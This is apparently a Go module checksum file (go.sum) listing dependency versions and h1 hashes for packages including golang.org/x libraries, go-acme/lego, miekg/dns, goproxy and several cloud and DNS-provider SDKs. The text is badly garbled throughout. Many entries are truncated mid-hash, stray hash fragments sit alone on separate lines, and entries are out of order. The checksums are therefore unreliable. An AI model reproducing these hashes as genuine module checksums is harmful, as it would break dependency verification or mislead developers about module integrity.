github.com/davecgh/go-spew v1.1.0/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
github.com/tidwall/tinyqueue v0.0.0-20180302190814-1e39f5511563 h1:Otn9S136ELckZ3KKDyCkxapfufrqDqwmGjcHfAyXRrE=
golang.org/x/sys v0.0.0-20200323222414-85ca7c5b95cd h1:xhmwyvizuTgC2qz7ZlMluP20uW
github.com/miekg/dns v1.1.22/go.mod h1:bPDLeHnStXmXAq1m/Ch/hvfNHr14JKNPMBo3VZKjuso=
github.com/elazarl/goproxy/ext v0.0.0-20190711103511-473e67f1d7d2 h1:dWB6v3RcOy03t/bUadywsbyrQwCqZeNIEX6M1OtSZOM=
github.com/golang/protobuf v1.3.1/go.mod h1:6lQm79b
Yts87kKdq0PP7pXfy6kDkUVs=
github.com/client9/misspell v0.3.4/go.mod h1:qj6jICC3Q7zFZvVWo7KLAzC3yx5G7kyvSDkc90ppPyw=
tSuHrBh6v692nyQe3ikrq0=
golang.org/x/sys v0.0.0-20181107165924-66b7b1311ac8/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
github.com/mwitkow/go-conntrack v0.0.0-20161129095857-cc309e4a2223/go.mod h1:qRWi
incompatible/go.mod h1:9I4somxYTbIHy5NJKHRl3wXiIaQGbYVAs8BPL6v8lEs=
2E5dAYhXwXZwtnZ6UAqBI28
golang.org/x/net v0.0.0-20190613194153-d28f0bde5980/go.mod h1:z5CRVTTTmAJ677TzLLGU
golang.org/x/net v0.0.0-20190503192946-f4e77d36d62c/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=
github.com/dgryski/go-sip13 v0.0.0-20181026042036-e10d5fee7954/go.mod h1:vAd38F8PWV
gopkg.in/ns1/ns1-go.v2 v2.0.0-20190730140822-b51389932cbc/go.mod h1:VV
wB1WAlocEru4wMGJxy
OItoe0UupaVj
github.com/onsi/ginkgo v1.7.0/go.mod h1:lLunBs/Ym6LB5Z9jYTR76FiuTmxDTDusOGeTQH
gopkg.in/yaml.v2 v2.2.1 h1:mUhvW9EsL
5dAk=
golang.org/x/oauth2 v0.0.0-20180821212333-d2e6202438be/go.mod h1:N/0e6XlmueqKjAGxoOufVs8QHGRruUQn6yWY3a
cloud.google.com/go v0.26.0/go.mod h1:aQUYkXzVsufM
zbrdMC2N0X/q21e6FI0LU=
gopkg.in/ini.v1 v1.44.0/go.mod h1:pNLf8WUiyNEtQjuu5G5vTm06TEv9tsIgeAvK8hOrP4k=
github.com/gopherjs/gopherjs v0.0.0-20181017120253-0766667cb4d1/go.mod h1:wJfORRmW1u3UXTncJ5qlYoELFm8eSnnEO6hX4iZ3EWY=
github.com/tidwall/grect v0.0.0-20161006141115-ba9a043346eb/go.mod h1:lKYYLFIr9OIgdgrtgkZ9zgRxRdvPYsExnYBsEAd8W5M=
9YlvaHOwJU=
github.com/kisielk/gotool v1.0.0/go.mod h1:XhKaO
github.com/gogo/protobuf v1.1.1/go.mod h1:r8qH/GZQm5c6nD/R0oafs1akxWv10x8SbQlK7atdtwQ=
wFjFa4jdeBTo=
github.com/go-acme/lego/v3 v3.1.0/go.mod h1:074uqt
github.com/julienschmidt/httprouter v1.2.0/go.mod h1:SYymIcj16QtmaHHD7aYtjjsJG7VTCxuUUipMqKk8s4w=
github.com/cpuguy83/go-md2man/v2 v2.0.0-20190314233015-f79a8a8ca69d/go.mod h1:maD7wRr/U5Z6m/iR4s
github.com/prometheus/client_model v0.0.0-20190115171406-56726106282f/go.mod h1:MbSGuTsp3dbXC40dX6PRTWyKYBIrTGTE9sqQNg2J8bo=
github.com/mwitkow/go-http-dialer v0.0.0-20161116154839-378f744fb2b8 h1:BhQQWYKJwXPtAhm12d4gQU4LKS9Yov22yOrDc2QA7ho=
golang.org/x/sys v0.0.0-20180830151530-49385e6e1522/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
github.com/fatih/structs v1.1.0/go.mod h1:9NiDSp5zOcgEDl
0za1rQkzVuMiMFI=
kPTs2tR8uOySCbBP7BN/M=
github.com/prometheus/procfs v0.0.0-20190507164030-5867b95ac084/go.mod h1:TjEm7ze935MbeOT/UhFTIMYKhuLP4wbCsTZCD3I8kEA=
naU5Q3cakzfE91YhliOondGd6ZrsDBHQE=
EcvlqZamSM4ZOMGlc93t6AcsBEu9Gc1vn7yk=
go.opencensus.io v0.21.0/go.mod h1:mSImk1erAIZhrmZN
github.com/nrdcg/namesilo v0.2.1/go.mod h1:lwMvfQTyYq
go.uber.org/ratelimit v0.0.0-20180316092928-c15da0234277/go.mod h1:2X8KaoNd1J0lZV
golang.org/x/tools v0.0.0-20190226205152-f727befe758c/go.mod h1:9Yl7xja0Znq3iFh3HoIrodX9oNMXvdceNzlUR8zjMvY=
6orDFRuTfBEV8e9/aOM/c4fVVCaMa2zaAs=
golang.org/x/sys v0.0.0-20190403152447-81d4e9dc473e/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/time v0.0.0-20190308202827-9d24e82272b4/go.mod h1:tRJNPiyCQ0inRvYxbN9jk5I
github.com/uber-go/atomic v1.3.2/go.mod h1:/Ct5t2lcmbJ4OSe/waGBoaVvVqtO0bmtfVNex1PFV8g=
github.com/mitchellh/go-vnc v0.0.0-20150629162542-723ed9867aed/go.mod h1:3rdaFaCv4AyBgu5ALFM0
github.com/tidwall/rtree v0.0.0-20180113144539-6cd427091e0e h1:
gopkg.in/yaml.v2 v2.2.1/go.mod h1:hI93XBmqTisBFMUTm0b8Fm
Z4whnwzcISnGGzXWMclvtLoiIKAKIo=
github.com/prometheus/client_model v0.0.0-20180712105110-5c3871d89910/go.mod h1:MbSGuTsp3dbXC40dX6PRTWyKYBIrTGTE9sqQNg2J8bo=
google.golang.org/grpc v1.21.0/go.mod h1:oYelfM1adQP15Ek0mdvEgi9Df8B9CZIaU1084ijfRaM=
github.com/onsi/ginkgo v1.6.0/go.mod h1:lLunBs/Ym6LB5Z9jYTR76FiuTmxDTDusOGeTQH
golang.org/x/crypto v0.0.0-20190308221718-c2843e01d9a2/go.mod h1:djNgcEr1/C05ACkg1iLfiJU5Ep61QUkGW8qpdssI0
3haRsgDiVLxyifmMBrBIuCWFBPYKbRssXB9z67Hw=
github.com/fsnotify/fsnotify v1.4.7 h1:IXs
golang.org/x/text v0.3.2 h1:tW2bmiBqwgJj/UpqtC8EpXEZVYOwU0yG4iWbprSVAcs=
8Mzv/fWEsPGWxqefPtCP5CnV9I=
7p3qQFaH3fOMXAJSrdZwGKcOO/lYdGS0HqGhPqDdTI=
golang.org/x/sys v0.0.0-20190412213103-97732733099d/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
CedLV8=
Q2gmZBxGxpX1KyK6N8kX8=
github.com/urfave/cli v1.22.1/go.mod h1:Gos4lmkARVdJ6EkW0WaNv/tZAAMe9V7XWyB60NtXRu0=
aDHdBFUsgrm6/TyX73Q=
QLmnXW2CcXuY
github.com/spf13/afero v1.1.2/go.mod h1:j4pytiNVoe2o6bmDsKpLACNPDBIoEAkihy7loJ1B0CQ=
github.com/goji/httpauth v0.0.0-20160601135302-2da839ab0f4d/go.mod h1:nnjvkQ9ptGaCkuDUx6wNykzzlUixGxvkme
github.com/ugorji/go v1.1.4/go.mod h1:uQMGLiO92mf5W77hV/PUCpI3pbzQx3CRekS0kk
Lt1CaY4wsPvgQH/jsuJi4XO2ssZbdsIizr4CVC8=
github.com/jmespath/go-jmespath v0.0.0-20180206201540-c2b33e8439af/go.mod h1:Nht3zPeWKUH0NzdCt2Blrr5ys8VGpn0CEB0cQHVjt7k=
github.com/beorn7/perks v1.0.1/go.mod h1:G2ZrVWU2WbWT9wwq4/hrbKbnv/1ERSJQ0ibhJ6rlkpw=
rwdDfMAkV7OtwuqBVzrE8GR6GFx
incompatible/go.mod h1:pdkljMzZIN41W
github.com/inconshreveable/go-vhost v0.0.0-20160627193104-06d84117953b h1:IpLPmn6Re21F0MaV6Zsc5RdSE6KuoFpWmHiUSEs3PrE=
Bao=
github.com/spaolacci/murmur3 v0.0.0-20180118202830-f09979ecbc72/go.mod h1:JwIasOWyU6f
kYO4g3RSRF0IAv0no=
github.com/liquidweb/liquidweb-go v1.6.0/go.mod h1:UDcVnAMDkZxpw4Y7NOHkqoeiGacVLEIG/i5J9cyixzQ=
ignqQo//hLXqYxZYVNs=
f3cWCs=
github.com/json-iterator/go v1.1.6/go.mod h1:
github.com/spf13/afero v1.1.2 h1:m8/z1t7/fwjysjQRYbP0RD
oy1omPYYDuagoSzA8v9mc=
github.com/xordataexchange/crypt v0.0.3-0.20170626215501-b2862e3d0a77/go.mod h1:aYKd//L2LvnjZzWKhF00oedf4jCCReLcmhLdhm1A27Q=
CntffsBHJ8nXQCwKr0/g8=
pc6Ldnwhi/IjpwHt7yyuwOQ=
github.com/kr/text v0.1.0 h1:45sCR5RtlFHMR4UwH9sdQ5TC8v0qDQCHnXt
rZTRtaJ1ow/lLfFfVYBRgL
github.com/prometheus/client_golang v0.9.3/go.mod h1:/TN21ttK/J9q6uSwhBd54HahCDft0ttaMvbicHlPoso=
L76gKKOs5djB6ezCbFQP1xR9D75/vuwEF3g=
golang.org/x/lint v0.0.0-20190313153728-d0100b6bd8b3/go.mod h1:6SW0HCj/g11FgYtHlgUYUwCkIfeOF89ocIRzGO/8vkc=
PY9ZHZUfv2irvY6gN279GOPZjmmk=
Eyxvry3ilGPewKoXw3XGN1k=
github.com/transip/gotransip v0.0.0-20190812104329-6d8d9179b66f/go.mod h1:i0f4R4o2HM0m3DZYQWsj6/MEowD57VzoH0v3d7igeFY=
github.com/json-iterator/go v1.1.7/go.mod h1:KdQUCv79m/52Kvf8AW2vK1V8akMuk1QjK/uOdHXbAo4=
github.com/golang/protobuf v1.3.2/go.mod h1:6lQm79b
AIuFBKMeze18XQ3eG1c=
JgMyC7bLPUVY133qvEBtVayf5mFgVsvEsIPBvNs=
FBtV6XMibvdAFo93nm5qn4U=
9nBpD9qZsTBoF41nW5L
github.com/BurntSushi/toml v0.3.1 h1:WXkYYl6Yr3qBf1K79EBnL4mak0OimBfB0XUf9Vl28OQ=
bJ4dT7Ms6E4xg4kGIyLM=
honnef.co/go/tools v0.0.0-20180728063816-88497007e858/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=
9v0W/tIY0Oo4OwrE=
6sfsiTG8qcWGx4=
0opPa2QZZtGFBFZlji/RkVcI2GknAs/DXo4wKdlNEc=
golang.org/x/tools v0.0.0-20180828015842-6cd1fcedba52/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
golang.org/x/tools v0.0.0-20190328211700-ab21143f2384/go.mod h1:LCzVGOaR6xXOjkQ3onu1FJEFr0SW1gC7cKk1uF8kGRs=
golang.org/x/sync v0.0.0-20181221193216-37e7f081c4d4/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/sys v0.0.0-20181122145206-62eef0e2fa9b/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
github.com/grpc-ecosystem/grpc-gateway v1.8.5/go.mod h1:vNeuVxBJEsws4ogUvrchl83t/GYV9WGTSLVdBhOQFDY=
github.com/tidwall/match v1.0.1/go.mod h1:LujAq0jyVjBy028G1WhWfIzbpQfMO8bBZ6Tyb0
golang.org/x/lint v0.0.0-20190409202823-959b441ac422/go.mod h1:6SW0HCj/g11FgYtHlgUYUwCkIfeOF89ocIRzGO/8vkc=
honnef.co/go/tools v0.0.0-20190418001031-e561f6794a2a/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=
yHo=
0iRr9ahx58uYLpLIr5fm8diHn0JbqRycJi6w0Ms=
uU2HOZ
github.com/stretchr/testify v1.4.0 h1:2E4SXV/wtOkTonXsotYi4li6zVWxYlZuYNCXe9XRJyk=
56JwCaLick0ClmMTw=
JS6plx
github.com/elazarl/goproxy v0.0.0-20190911111923-ecfe977594f1/go.mod h1:Ro8st/ElPeALwNFlcTpWmkr6IoMFfkjXAvTHpevnDsM=
c71tQlGr9SeGrg=
QSZzlgNrpq9mjcfDemuexIKsU=
github.com/beorn7/perks v1.0.0/go.mod h1:KWe93zE9D1o94FZ5RNwFwVgaQK1VOXiVxmqh
github.com/tidwall/buntdb v1.1.0 h1:H6LzK59KiNjf1nHVPFrYj4Qnl8d8YLBsYamdL8N
3Ies8=
github.com/coreos/etcd v3.3.10
c9Xaiz6
github.com/xiang90/probing v0.0.0-20190116061207-43a291ad63a2/go.mod h1:UETIi67q53MR2AWcXfiuqkDkRtnGDLqkBTpCHuJHxtU=
github.com/prometheus/client_golang v1.1.0/go.mod h1:I1FGZT9
github.com/spf13/pflag v1.0.3 h1:zPAT6CGy6wXeQ7NtTnaTerfKOsV6V6F8agHXFiazDkg=
golang.org/x/net v0.0.0-20190923162816-aa69164e4478/go.mod h1:z5CRVTTTmAJ677TzLLGU
gopkg.in/tomb.v1 v1.0.0-20141024135613-dd632973f1e7/go.mod h1:dt/ZhP58zS4L8KSrWDmTeBkI65Dw0HsyUHuEVlX15mw=
github.com/nbio/st v0.0.0-20140626010706-e9e8d9816f32/go.mod h1:9wM
NZz0KFw=
github.com/ovh/go-ovh v0.0.0-20181109152953-ba5adb4cf014/go.mod h1:joRatxRJaZBsY3JAOEMcoOp05CnZzsx4scTxi95DHyQ=
3Td9dZw=
github.com/coreos/bbolt v1.3.2/go.mod h1:iRUV2dpdMOn7Bo10OQBFzIJO9kkE559Wcmn
google.golang.org/api v0.4.0/go.mod h1:8k5glujaEP
incompatible/go.mod h1:uF7uidLiAD3TWHmW31ZFd/JWoc32PjwdhPthX9715RE=
github.com/konsorten/go-windows-terminal-sequences v1.0.1/go.mod h1:T0
github.com/go-ini/ini v1.44.0/go.mod h1:ByCAeIL28uOIIG0E3PJtZPDL8WnHpFKFOtgjp
9jd8WM5uGBxy
github.com/cenkalti/backoff/v3 v3.0.0/go.mod h1:cIeZDE3IrqwwJl6VUwCN6trj1oXrTS4rc0ij
github.com/beorn7/perks v0.0.0-20180321164747-3a771d992973/go.mod h1:Dwedo/Wpr24TaqPxmxbtue
github.com/chzyer/readline v0.0.0-20180603132655-2972be24d48e/go.mod h1:nSuG5e5PlCu98SY8svDHJxuZscDgtXS6KTTbou5AhLI=
cUD/ELuzDCXwHUVA=
github.com/armon/consul-api v0.0.0-20180202201655-eb2c6b5be1b6/go.mod h1:grANhF5doyWs3UAsr3K4I6qtAmlQcZDesFNEHPZAzj8=
github.com/jtolds/gls v4.20.0
FlcbWjRDT7yAxhJNAiPPLOFECq181zc=
i8G65rmVagqKMtkk=
qkEiiKk=
UnNGt0IhNNJLkGikcdcJqm66zGD/uJGMRxK/9
github.com/cloudflare/cloudflare-go v0.10.2/go.mod h1:qhVI5MKwBGhdNU89ZRz2plgYutcJ5PCekLxXn56w6SY=
gopkg.in/resty.v1 v1.12.0/go.mod h1:mDo4pnntr5jdWRML875a/NmxYqAlA73dVijT2AXvQQo=
github.com/prometheus/common v0.4.1/go.mod h1:TNfzLD0ON7rHzMJeJkieUDPYmFC7Snx/y86RQel1bk4=
github.com/hashicorp/golang-lru v0.5.3/go.mod h1:iADmTwqILo4mZ8BN3D2Q6
github.com/linode/linodego v0.10.0/go.mod h1:cziNP7pbvE3mXIPneHj0oRY8L1WtGEIKlZ8LANE4eXA=
eRnpl9moKnB4QOLf1HestfXbmab5FXxiDBjc=
github.com/stretchr/testify v1.3.0/go.mod h1:M5WIy9Dh21IEIfnGCwXGc5bZfKNJtfHm1UVUgZn
github.com/xeipuuv/gojsonpointer v0.0.0-20180127040702-4e3ac2762d5f/go.mod h1:N2zxlSyiKSe5eX1tZViRH5QA0qijqEDrYZiPEAiq3wU=
github.com/chzyer/test v0.0.0-20180213035817-a1ea475d72b1/go.mod h1:Q3SI9o4m/ZMnBNeIyt5eFwwo7qiLfzFZmjNmxjkiQlU=
github.com/gogo/protobuf v1.2.1/go.mod h1:hp
woV0toclVaRGI8pc=
golang.org/x/tools v0.0.0-20180917221912-90fa682c2a6e/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
github.com/Azure/go-autorest/autorest/validation v0.1.0/go.mod h1:Ha3z/SqBeaalWQvokg3NZAlQTalVMtOIAs1aGK7G6u8=
google.golang.org/appengine v1.1.0/go.mod h1:EbEs0AVv82hx2wNQdGPgUI5lhzA/G0D9YwlJXL52JkM=
google.golang.org/genproto v0.0.0-20190307195333-5fe7a883aa19/go.mod h1:VzzqZJRnGkLBvHegQrXjBqPurQTc5/KpmUdxsrq26oE=
github.com/chzyer/logex v1.1.10 h1:Swpa1K6QvQznwJRcfTfQJmTE72DqScAa40E
lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=
gbHU/CVuBBDIJjb2X0qEXbFg53c61hWP/1CpauHY=
L2hUp1rHADufV3IMtnDRdf1r5NINEl0=
google.golang.org/api v0.8.0/go.mod h1:o4eAsZoiT
wExME=
mIA639KxkE=
github.com/sirupsen/logrus v1.4.2/go.mod h1:tLMulIdttU9McNUspp0xgXVQah82FyeX6MwdIuYE2rE=
github.com/Azure/go-autorest/autorest/adal v0.1.0/go.mod h1:MeS4XhScH55IST095THyTxElntu7WqB7pNbZo8Q5G3E=
golang.org/x/sys v0.0.0-20180622082034-63fc586f45fe/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
bacwQ=
github.com/gorilla/mux v1.7.3 h1:gnP5JzjVOuiZD07fKKToCAOjS0yOpj/qPETTXCCS6hw=
github.com/kr/pretty v0.1.0/go.mod h1:dAy3ld7l9f0ibDNOQOHHMYYIIbhfbHSm3C4ZsoJORNo=
4EoQTLFTRgOQ1FBLkstjWtayDeSgw=
github.com/prometheus/procfs v0.0.3/go.mod h1:4A/X28fw3Fc593LaREMrKMqOKvUAntwMDaekg4FpcdQ=
github.com/modern-go/reflect2 v0.0.0-20180701023420-4b7aa43c6742/go.mod h1:bx2lNnkwVCuqBIxFjflWJWanXIb3RllmbCylyMrvgv0=
github.com/spf13/jwalterweatherman v1.0.0/go.mod h1:cQK4TGJAtQXfYWX
github.com/smartystreets/goconvey v0.0.0-20190330032615-68dc04aab96a/go.mod h1:syvi0/a8iFYH4r/RixwvyeAJjdLS9QV7WQ/tjFTllLA=
OPACYpWeL0wqObRcbAqCMya13uyzqw0=
bsCNELL
sBenx6DDtFZJxhVysOjyk=
golang.org/x/net v0.0.0-20181220203305-927f97764cc3/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
github.com/oracle/oci-go-sdk v7.0.0
golang.org/x/tools v0.0.0-20190114222345-bf090417da8b/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
RGrc=
github.com/spf13/cast v1.3.0/go.mod h1:Qx5cxh0v
golang.org/x/tools v0.0.0-20190312170243-e65039ee4138/go.mod h1:LCzVGOaR6xXOjkQ3onu1FJEFr0SW1gC7cKk1uF8kGRs=
g9n7WNsDg8QP6cUVNI86fCNMcbazEtwE=
github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b/go.mod h1:SBH7ygxi8pfUlaOkMMuAQtPIUF8ecWP5IEl/CR7VP2Q=
9X1NB3Zf8V7Ke586lFgjr2dZNuvo3lPJSGZ5JPQ=
golang.org/x/sys v0.0.0-20190922100055-0a153f010e69/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
github.com/fsnotify/fsnotify v1.4.7/go.mod h1:jwhsz4b93w/PPRr/qN1Yymfu8t87LnFCMoQvtojpjFo=
github.com/google/gofuzz v1.0.0/go.mod h1:dBl0BpW6vV/
github.com/rcrowley/go-metrics v0.0.0-20181016184325-3113b8401b8a/go.mod h1:bCqnVzQkZxMG4s8nGwiZ5l3QUCyqpo9Y
github.com/Azure/azure-sdk-for-go v32.4.0
github.com/chzyer/logex v1.1.10/go.mod h1:
github.com/modern-go/concurrent v0.0.0-20180228061459-e0a39a4cb421/go.mod h1:6dJC0mAP4ikYIbvyc7fijjWJddQyLn8Ig3JB5CqoB9Q=
github.com/google/btree v1.0.0/go.mod h1:lNA
DGbO/tpwLR1m
gopkg.in/resty.v1 v1.9.1/go.mod h1:vo52Hzryw9PnPHcJfPsBiFW62XhNx5OczbV9y
fYpKTKJ/5opWmZ34k=
github.com/hashicorp/golang-lru v0.5.1/go.mod h1:/m3WP610KZHVQ1SGc6re/UDhFvYD7pJ4Ao
github.com/sirupsen/logrus v1.2.0/go.mod h1:LxeOpSwHxABJmUn/MG1IvRgCAasNZTLOkJPxbbu5VWo=
golang.org/x/sys v0.0.0-20181116152217-5ac8a444bdc5/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
google.golang.org/appengine v1.5.0/go.mod h1:xpcJRLb0r/rnEns0DIKYYv
golang.org/x/sys v0.0.0-20200323222414-85ca7c5b95cd/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
/ZMZ9VjZe4=
github.com/satori/go.uuid v1.2.0/go.mod h1:dA0hQrYB0VpLJoorglMZABFdXlWrHn1NEOzdhQKdks0=
github.com/pkg/errors v0.8.1/go.mod h1:bwawxfHBFNV
VCXIR8NYKpDr8/dg1HKfQoRHCdcsROXKvmoehKA=
github.com/fatih/color v1.7.0/go.mod h1:Zm6kSWBoL9eyXnKyktHP6abPY2pDugNf5KwzbycvMj4=
C3Rm0FD/WLDX8884=
ibD93RtjEohWalFOjRDx6CVaqeizhEnKg=
uSET
github.com/elazarl/goproxy/ext v0.0.0-20190711103511-473e67f1d7d2/go.mod h1:gNh8nYJoAm43RfaxurUnxr
golang.org/x/sys v0.0.0-20190507160741-ecd444e8653b/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
go.uber.org/atomic v1.3.2/go.mod h1:gD2HeocX3
golang.org/x/crypto v0.0.0-20190923035154-9ee001bba392/go.mod h1:/lpIB1dKB
golang.org/x/crypto v0.0.0-20180904163835-0709b304e793/go.mod h1:6SG95UA2DQfeDnfUPMdvaQW0Q7yPrPDi9nlGo2tz2b4=
github.com/go-kit/kit v0.8.0/go.mod h1:xBxKIO96dXMWWy0MnWVtmwkA9/13aqxPnvrjFYMA2as=
github.com/google/btree v0.0.0-20180813153112-4030bb1f1f0c/go.mod h1:lNA
E42TnysNCUPdjciGhY=
golang.org/x/sys v0.0.0-20180909124046-d0be0721c37e/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
github.com/stretchr/objx v0.1.1/go.mod h1:HFkY916IF
github.com/aws/aws-sdk-go v1.23.0/go.mod h1:KmX6BPdI08NWTb3/sm4ZGu5ShLoqVDhKgpiN924inxo=
github.com/spf13/pflag v1.0.3/go.mod h1:DYY7MBk1bdzusC3SYhjObp
github.com/baiyubin/aliyun-sts-go-sdk v0.0.0-20180326062324-cfa1a18b161f/go.mod h1:AuiFmCCPBSrqvVMvuqFuk0qogytodnVFVSN5CeJB8Gc=
golang.org/x/text v0.3.1-0.20180807135948-17ff2d5776d2/go.mod h1:NqM8EUOU14njkJ3fqMW
github.com/mattn/go-colorable v0.1.4 h1:snbPLB8fVfU9iwbbo30TPtbLRzwWu6aJS6Xh4eaaviA=
golang.org/x/oauth2 v0.0.0-20190226205417-e64efc72b421/go.mod h1:gOpvHmFTYa4IltrdGE7lF6nIHvwfUNPOp7c8zoXwtLw=
MFFWcvkIS/tQcRk01m1F5IRFswLeQ
golang.org/x/sys v0.0.0-20190422165155-953cdadca894/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
gfupTy94rShfmMCWGDn0LpTmnzTp2qbd1dvSRU=
github.com/Azure/go-autorest/autorest v0.5.0/go.mod h1:9HLKlQjVBH6U3oDfsXOeVc56THsLPw1L03yban4xThw=
ygLZcrzQJaqmWj9AIm7n08wl/qW/PE=
m/2kptfBszLMUkC4ZK/EgS/cQ=
github.com/skratchdot/open-golang v0.0.0-20160302144031-75fb7ed4208c/go.mod h1:sUM3LWHvSMaG192sy56D9F7CNvL7jUJVXoqM1QKLnog=
github.com/google/uuid v1.1.1/go.mod h1:TIyPZe4MgqvfeYDBFedMoGGpEw/LqOeaOT
golang.org/x/lint v0.0.0-20181026193005-c67002cb31c3/go.mod h1:UVdnD1Gm6xHRNCYTkRU2/jEulfH38KcIWyp/GAMgvoE=
ULvLYs=
QiTn7sK6flMKIvNmpqz1qrpP3Ps6jOKIKMooyg4=
golang.org/x/text v0.3.0 h1:g61tztE5qeGQ89tm6NTjjM9VPIm088od1l6aSorWRWg=
golang.org/x/net v0.0.0-20190311183353-d8887717615a/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=
cloud.google.com/go v0.34.0/go.mod h1:aQUYkXzVsufM
fhmuc
github.com/namedotcom/go v0.0.0-20180403034216-08470befbe04/go.mod h1:5sN
github.com/soheilhy/cmux v0.1.4/go.mod h1:IM3LyeVVIOuxMH7sFAkER9
github.com/go-acme/lego/v3 v3.1.0 h1:yanYFoYW8azFkCvJfIk7edWWfjkYkhDxe45ZsxoW4Xk=
T0U=
github.com/cenkalti/backoff/v3 v3.0.0 h1:ske
golang.org/x/sync v0.0.0-20190227155943-e225da77a7e6/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/crypto v0.0.0-20190701094942-4def268fd1a4/go.mod h1:yigFU9vqHzYiE8UmvKecakEJjdnWj3jj499lnFckfCI=
github.com/oklog/ulid v1.3.1/go.mod h1:CirwcVhetQ6Lv90oh/F
mEhP44yOT
google.golang.org/api v0.3.1/go.mod h1:6wY9I6uQWHQ8EM57III9mq/AjF
pL9E=
github.com/miekg/dns v1.1.15/go.mod h1:W1PPwlIAgtquWBMBEV9nkV9Cazfe8ScdGz/Lj7v3Nrg=
9EgE3H3cr1v9wB50oz8l4C4h62xy7jSTY=
9EI=
github.com/prometheus/common v0.2.0/go.mod h1:TNfzLD0ON7rHzMJeJkieUDPYmFC7Snx/y86RQel1bk4=
gopkg.in/square/go-jose.v2 v2.3.1/go.mod h1:M9dMgbHiYLoDGQrXy7OpJDJWiKiU//h
github.com/iij/doapi v0.0.0-20190504054126-0bbf12d6d7df/go.mod h1:QMZY7/J/KSQEhKWFeDesPjMj
gopkg.in/ini.v1 v1.42.0/go.mod h1:pNLf8WUiyNEtQjuu5G5vTm06TEv9tsIgeAvK8hOrP4k=
5NUziq4I4S80YR8gNf3Q=
contrib.go.opencensus.io/exporter/ocagent v0.4.12/go.mod h1:450APlNTSR6FrvC3CTRqYosuDstRB9un7SOx2k/9ckA=
github.com/Azure/go-autorest/autorest/adal v0.2.0/go.mod h1:MeS4XhScH55IST095THyTxElntu7WqB7pNbZo8Q5G3E=
github.com/dnsimple/dnsimple-go v0.30.0/go.mod h1:O5TJ0/U6r7AfT8niYNlmohpLbCSG
vvW/OXSQhTDSoE431IQ=
PxJk/5
github.com/alecthomas/template v0.0.0-20160405071501-a0175ee3bccc/go.mod h1:LOuyumcjzFXgccqObfd/Ljyb9UuFJ6TxHnclSeseNhc=
go.uber.org/atomic v1.4.0/go.mod h1:gD2HeocX3
github.com/tidwall/btree v0.0.0-20170113224114-9876f1454cf0 h1:QnyrPZZvPmR0AtJCxxfCtI1qN
github.com/matttproud/golang_protobuf_extensions v1.0.1/go.mod h1:D8He9yQNgCq6Z5Ld7szi9bcBfOoFv/3dc6xSMkL2PC0=
/kpz8xl9cbzE=
github.com/Azure/go-autorest/autorest/azure/cli v0.1.0/go.mod h1:Dk8CUAt/b/PzkfeRsWzVG9Yj3ps8mS8ECztu43rdU8U=
github.com/tidwall/buntdb v1.1.0/go.mod h1:Y39xhcDW10WlyYXeLgGftXVbjtM0QP
github.com/eapache/go-resiliency v1.1.0/go.mod h1:kFI
gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
github.com/golang/mock v1.2.0/go.mod h1:oTYuIxOrZwtPieC
github.com/prometheus/common v0.6.0/go.mod h1:eBmuwkDJBwy6iBfxCBob6t6dR6ENT/y
incompatible/go.mod h1:9XXNKU
W8Uxz3IHJYH5QSwggIsqBzpuz5H//U1FU=
Zp71q/5VxRsJ6NXXVCE5NRUHRo
github.com/census-instrumentation/opencensus-proto v0.2.0/go.mod h1:f6KPmirojxKA12rnyqOA5BBL4O983OfeGPqjHWSTneU=
yp6POWl0qKG85gN/melR3HDY=
github.com/russross/blackfriday/v2 v2.0.1/go.mod h1:
IhRZpIIk=
honnef.co/go/tools v0.0.0-20190106161140-3f1c8253044a/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=
incompatible/go.mod h1:E3ru
github.com/go-errors/errors v1.0.1/go.mod h1:f4zRHt4oKfwPJE5k8C9vpYG
github.com/tidwall/tinyqueue v0.0.0-20180302190814-1e39f5511563/go.mod h1:mLqSmt7Dv/CNneF2wfcChfN1rvapyQr01LGKnKex0DQ=
HPhhw
github.com/pierrec/lz4 v2.0.5
golang.org/x/sys v0.0.0-20190209173611-3b5209105503/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
golang.org/x/crypto v0.0.0-20190923035154-9ee001bba392 h1:ACG4HJsFiNMf47Y4PeRoebLNy/2lXT9EtprMuTFWt1M=
